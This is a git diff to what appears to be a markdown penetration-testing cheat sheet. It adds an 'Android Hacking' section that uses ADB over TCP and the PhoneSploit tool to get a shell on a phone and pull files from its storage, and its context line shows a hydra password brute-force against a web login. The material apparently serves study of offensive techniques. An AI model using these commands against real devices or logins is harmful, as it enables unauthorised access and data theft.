@@ -331,6 +331,51 @@ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-fo
 
 
    <img src="Crytool.jpg" />   
-   
-   
+
   </details> 
+
+  # Android Hacking
+  <details>
+  <summary>ADB</summary>
+  ```shell
+
+sudo apt-get install adb -y
+adb devices
+
+# Connection Establish Steps
+adb usb
+adb tcpip 5555
+adb connect xxx.xxx.xxx.xxxx
+
+# PhoneSploit tool 
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+OR
+python3 -m pip install colorama
+
+python3 phonesploit.py
+
+# Type 3 and Press Enter to Connect a new Phone
+# Enter IP of Android Device
+# Type 4, to Access Shell on phone, ENter IP if required
+
+pwd
+ls
+cd sdcard
+ls
+cd Download
+
+# Download a File from Android
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+
+
+```
+
+
+  
+  
+  
+  </details?
+  
